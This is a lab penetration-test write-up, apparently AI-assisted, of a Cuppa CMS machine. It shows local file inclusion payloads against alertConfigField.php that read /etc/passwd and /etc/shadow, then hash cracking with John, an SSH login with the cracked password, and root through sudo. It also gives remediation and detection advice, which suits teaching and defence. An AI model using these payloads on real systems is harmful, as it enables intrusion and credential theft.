# Full Writeup — Alpha Attack (Cuppa CMS LFI)

> **Comprehensive, professional penetration test writeup** for the Alpha Attack Cuppa CMS lab. This document is a step‑by‑step, reproducible record of the engagement: discovery, enumeration, exploitation, post‑exploitation, remediation and detection guidance. Include screenshots and artifacts in the `screenshots/` and `outputs/` folders referenced throughout.

---

## Table of Contents

1. [Summary & Objectives](#summary--objectives)
2. [Rules of Engagement & Environment](#rules-of-engagement--environment)
3. [Timeline & Workflow](#timeline--workflow)
4. [Reconnaissance](#reconnaissance)
5. [Web Enumeration](#web-enumeration)
6. [Vulnerability Identification (LFI)](#vulnerability-identification-lfi)
7. [Exploitation](#exploitation)
8. [Post‑Exploitation & Privilege Escalation](#post-exploitation--privilege-escalation)
9. [Evidence & Artifacts](#evidence--artifacts)
10. [Findings & Risk Assessment](#findings--risk-assessment)
11. [Remediation & Mitigations](#remediation--mitigations)
12. [Detection & Monitoring Recommendations](#detection--monitoring-recommendations)
13. [Appendix: Commands & Payloads](#appendix-commands--payloads)
14. [Appendix: Deliverables](#appendix-deliverables)

---

## Summary & Objectives

**Objective:** Demonstrate a complete attack chain against a vulnerable Cuppa CMS instance in a controlled lab environment to highlight systemic weaknesses (insecure code, weak credentials, excessive privileges) and provide practical remediation steps.

**High-level outcome:** Using a Local File Inclusion (LFI) vulnerability in `alertConfigField.php`, we retrieved system files including `/etc/passwd` and `/etc/shadow`, recovered a weak credential via offline cracking, achieved SSH access, and escalated to root due to misconfigured sudo privileges.

---

## Rules of Engagement & Environment

* **Scope:** Isolated lab network `192.168.56.0/24` — target VM `192.168.56.101` (Cuppa CMS).
* **Authorization:** All testing performed in a lab owned by the project team. No external targets were engaged.
* **Non‑destructive:** The assessment avoided destructive actions; no data exfiltration beyond the lab, no denial-of-service attempts.
* **Artifacts preserved:** All scan outputs, ZAP session files, and password cracking potfiles are stored in `/outputs` for reproducibility.

---

## Timeline & Workflow

* **T+00:00 — Reconnaissance:** Network discovery with nmap/Zenmap identified active host at `192.168.56.101`.
* **T+00:30 — Web enumeration:** ZAP + FoxyProxy captured web traffic; forced browse discovered admin path `/administrator/`.
* **T+01:00 — Vulnerability discovery:** Identified `alertConfigField.php` with an injectable `urlConfig` parameter.
* **T+01:30 — Exploitation:** Crafted LFI payloads to retrieve sensitive filesystem files.
* **T+02:00 — Credential recovery:** Extracted hash, cracked using John the Ripper with `rockyou.txt`.
* **T+02:30 — Initial access & escalation:** SSH login and `sudo` misconfiguration leading to root shell.

---

## Reconnaissance

### Goals

* Quickly discover live hosts and open ports.
* Enumerate services to identify likely attack surface (web services, login portals, outdated software).

### Tools used

* `nmap` / `Zenmap`
* `arp-scan` (optional)
* `ip addr`, `ip route`

### Key commands & notes

```bash
# find local interfaces
ip addr show

# ping sweep to discover hosts
nmap -sn 192.168.56.0/24

# comprehensive scan on target
nmap -A -sV -p- 192.168.56.101 -oA outputs/nmap/initial_scan
```

### Findings

* Host `192.168.56.101` was live with services on ports: 21 (FTP), 22 (SSH), 80 (HTTP), 3306 (MySQL).  Screenshots: `screenshots/recon-1.png`, `screenshots/recon-2.png`, `screenshots/recon-3.png`.

---

## Web Enumeration

### Goals

* Discover web application endpoints, administration panels, parameterized pages, and input points for manipulation.

### Tools used

* Browser + **FoxyProxy** → **OWASP ZAP** (intercept, spider, forced browse)
* `gobuster` or `dirbuster` for directory brute force
* Manual inspection of HTTP responses

### Process

1. Configure FoxyProxy to route browser traffic to ZAP. 2. Browse the site manually and allow ZAP to spider and record. 3. Run forced-browse with `big.txt` to detect hidden directories. 4. Review JavaScript, comments, and configuration files referenced in web pages.

### Key findings

* Admin endpoint discovered at `/administrator/`.
* A parameterized script `alertConfigField.php` accepted a `urlConfig` parameter.  Screenshots: `screenshots/webenum-1.png`, `screenshots/webenum-2.png`, `screenshots/webenum-3.png`.

---

## Vulnerability Identification (LFI)

### Investigation

* Inspecting requests to `alertConfigField.php` revealed a `urlConfig` parameter that was concatenated into a file/include operation server-side without sufficient validation.
* Proof-of-concept attempts to reference local files (e.g., `../../../../etc/passwd`) returned content from the server filesystem.

### Evidence

* HTTP response contained familiar `/etc/passwd` format lines.
* ZAP history log and saved request/response pairs are stored in `outputs/zap/session.session` (exported).

**Screenshots:** `screenshots/lfi-1.png`, `screenshots/lfi-2.png`, `screenshots/lfi-3.png`.

---

## Exploitation

### Objective

* Use LFI to read sensitive files that allow offline credential recovery and further compromise.

### Steps & payloads

1. Confirmed file-read via direct request (example):

```
GET /alertConfigField.php?urlConfig=../../../../../../etc/passwd HTTP/1.1
Host: 192.168.56.101
```

2. Iteratively adjusted traversal depth to reach filesystem root.
3. Retrieved `/etc/passwd` and `/etc/shadow` (shadow content may be visible in this lab due to misconfiguration or via inclusion of configuration files pointing to hashed passwords).
4. Saved outputs to `outputs/exfiltrated/etc_passwd.txt` and `outputs/exfiltrated/etc_shadow.txt` for offline analysis.

**Commands (example to retrieve via curl):**

```bash
curl 'http://192.168.56.101/alertConfigField.php?urlConfig=../../../../../../etc/passwd' -o outputs/exfiltrated/etc_passwd.txt
```

**Screenshots:** `screenshots/exploit-1.png`, `screenshots/exploit-2.png`, `screenshots/exploit-3.png`.

---

## Password Cracking

### Objective

* Recover plaintext credentials from extracted password hashes to gain authenticated access.

### Process

1. Extracted `w1r3s` entry and associated hash from `/etc/shadow` into `unshadow.txt`.
2. Used John the Ripper with a known wordlist (rockyou) to attempt cracking.

**Commands:**

```bash
# prepare unshadow file if necessary
# run john
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt --pot=outputs/john/john.pot
# show cracked
john --show unshadow.txt --pot=outputs/john/john.pot
```

**Result:** password recovered: `computer` (documented in `outputs/john/john-show.txt`).  Screenshots: `screenshots/john-1.png`, `screenshots/john-2.png`, `screenshots/john-3.png`.

**Note on ethics:** Never upload real password lists or cracked credentials to public repositories. In this lab the credentials are synthetic for educational purposes.

---

## Initial Access & Privilege Escalation

### Initial access

* SSH into the target using recovered credentials:

```bash
ssh w1r3s@192.168.56.101
# password: computer
```

### Privilege enumeration

* Checked sudo rights:

```bash
sudo -l
```

* Output indicated `w1r3s` could run commands as root without password (or had NOPASSWD). This is a critical misconfiguration.

### Escalation

* Escalated to root:

```bash
sudo -i
# now root
cat /root/flag.txt
```

**Screenshots:** `screenshots/priv-1.png`, `screenshots/priv-2.png`, `screenshots/priv-3.png`.

---

## Evidence & Artifacts

All artifacts collected during the engagement are stored under `/outputs` and include:

* `outputs/nmap/initial_scan.nmap`, `initial_scan.xml`
* `outputs/zap/session.session` (ZAP session export)
* `outputs/exfiltrated/etc_passwd.txt`, `etc_shadow.txt`
* `outputs/john/john.pot`, `john-show.txt`

**Important:** Before publishing the repository publicly, **redact** or remove any real secrets, private keys, personal data, or anything that could identify a real environment.

---

## Findings & Risk Assessment

### Critical findings

1. **Local File Inclusion (LFI)** — enables arbitrary local file reads. Risk: Critical (pre-auth remote information disclosure).
2. **Weak/Crackable Credentials** — recovered via offline attack. Risk: High.
3. **Over-Privileged User (sudo misconfig)** — allowed root escalation. Risk: Critical.

### Impact

A chained exploitation of these issues results in full system compromise, potential lateral movement within a network, and data exposure.

---

## Remediation & Mitigations

### Immediate fixes

* **Patch/Remove LFI:** sanitize and validate `urlConfig` input. Use whitelist pattern matching for allowed resources or remove direct file inclusion logic.
* **Credential policy:** enforce strong password rules, expire default passwords, and enable multi-factor authentication for administrative access.
* **Least privilege:** remove NOPASSWD sudo entries and review `/etc/sudoers` for over-privileged accounts.

### Long-term recommendations

* Implement code review and secure development lifecycle (S-SDLC).
* Employ WAF or runtime application self-protection to help detect abnormal file access patterns.
* Centralize logging and employ SIEM/IDS to detect suspicious behavior (unexpected file reads, repeated login attempts, use of privileged commands).

---

## Detection & Monitoring Recommendations

* Monitor for LFI indicators: requests with `../` segments or suspicious `urlConfig` values.
* Alert on reads of sensitive file paths (e.g., `/etc/shadow`, `/etc/passwd`, configuration files).
* Detect and alert on creation of pot files or suspicious use of `john`-like processes inside your environment (if monitoring internal hosts).
* Use file integrity monitoring for critical system files.

---

## Appendix: Commands & Payloads

This appendix lists the exact commands and example payloads used during testing. Use them in a lab environment only.

### Nmap

```bash
nmap -sn 192.168.56.0/24 -oA outputs/nmap/ping_sweep
nmap -A -sV -p- 192.168.56.101 -oA outputs/nmap/initial_scan
```

### Gobuster (web forced browse)

```bash
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt -t 50 -o outputs/gobuster/webenum.txt
```

### ZAP (manual requests)

* Use FoxyProxy to route the browser via ZAP. Intercept, edit requests and export session.

### LFI payload examples

```
/alertConfigField.php?urlConfig=../../../../../../../etc/passwd
/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../../../../../../../etc/shadow
```

### John the Ripper

```bash
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt --pot=outputs/john/john.pot
john --show unshadow.txt --pot=outputs/john/john.pot
```

### SSH & Privilege escalation

```bash
ssh w1r3s@192.168.56.101
sudo -l
sudo -i
```

---

## Appendix: Deliverables

The repository contains the following deliverables (redact before publishing):

* `README.md` (project overview)
* `writeup/full_writeup.md` (this document)
* `writeup/commands_and_notes.md` (quick commands cheatsheet)
* `presentation/AlphaAttack_presentation.pdf` and `.pptx`
* `screenshots/` (3 images per section)
* `outputs/` (nmap, zap sessions, john potfiles, exfiltrated files) — **REDACT SENSITIVE DATA**

---

## Closing Notes

This writeup is written as an educational artifact to help defenders understand attacker thinking and to improve secure development and operations. If you want, I can:

* Generate a sanitized version of `outputs/` suitable for public release.
* Produce a redaction checklist and a small script to automatically remove or mask sensitive strings from output files.
* Convert this writeup into a formatted PDF and include inline screenshots and captions.

If you'd like any of the above, tell me which and I'll produce it next.

